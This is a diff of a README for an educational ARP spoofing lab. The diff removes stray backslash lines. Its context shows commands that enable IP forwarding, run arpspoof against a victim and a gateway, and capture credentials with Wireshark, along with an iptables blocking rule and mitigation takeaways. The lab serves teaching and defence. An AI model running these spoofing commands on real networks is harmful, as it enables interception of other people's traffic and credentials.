@@ -86,17 +86,15 @@ This lab simulates an ARP spoofing attack to demonstrate vulnerabilities in loca
 # 1. Enable IP forwarding
 echo 1 > /proc/sys/net/ipv4/ip_forward
 
-\ \
 
 # 2. Launch ARP spoof against victim and gateway
 arpspoof -i eth0 -t [victim_ip] [gateway_ip]
 arpspoof -i eth0 -t [gateway_ip] [victim_ip]
 
-\ \
+
 
 # 3. Capture traffic (e.g., credentials) with Wireshark
 
-\ \
 
 
 
@@ -104,13 +102,13 @@ arpspoof -i eth0 -t [gateway_ip] [victim_ip]
 # Block spoofed traffic using iptables
 iptables -A INPUT -m mac --mac-source [attacker_mac] -j DROP
 
-\
+
 
 ### 📚 Educational Takeaways
 - ARP lacks authentication, making LANs susceptible to spoofing.
 - Dynamic ARP tables can be manipulated silently.
 - Proper segmentation, static ARP, and intrusion detection can help mitigate risks.
-\
+
 ### 📁 Files Included
 - demo_notes.md: Step-by-step walkthrough
 - lab_topology.png: Network diagram
